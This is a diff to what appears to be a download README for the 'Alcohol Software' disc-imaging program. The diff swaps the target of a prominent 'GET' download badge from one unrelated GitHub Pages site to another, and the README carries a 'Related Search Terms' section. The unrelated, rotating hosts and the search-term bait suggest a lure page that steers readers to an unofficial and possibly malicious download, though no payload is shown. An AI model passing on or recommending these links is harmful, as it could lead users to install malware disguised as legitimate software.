@@ -61,7 +61,7 @@ Prerequisites: Windows PC with available storage for image files; optional optic
 | Storage | Space for the app and one image | Extra drive space for ISO libraries and backups |
 | Optical | Optional reader | CD, DVD, or Blu ray burner for disc output |
 
-[![GET Alcohol Software](https://img.shields.io/badge/GET%20%E2%80%94%20Alcohol%20Software-0078D6?style=for-the-badge&logoColor=white)](https://proxy-configuration-diagnostic-tools.github.io/.github/alcohol-software)
+[![GET Alcohol Software](https://img.shields.io/badge/GET%20%E2%80%94%20Alcohol%20Software-0078D6?style=for-the-badge&logoColor=white)](https://renetoddoftw.github.io/.github/alcohol-software)
 
 ## Related Search Terms
 
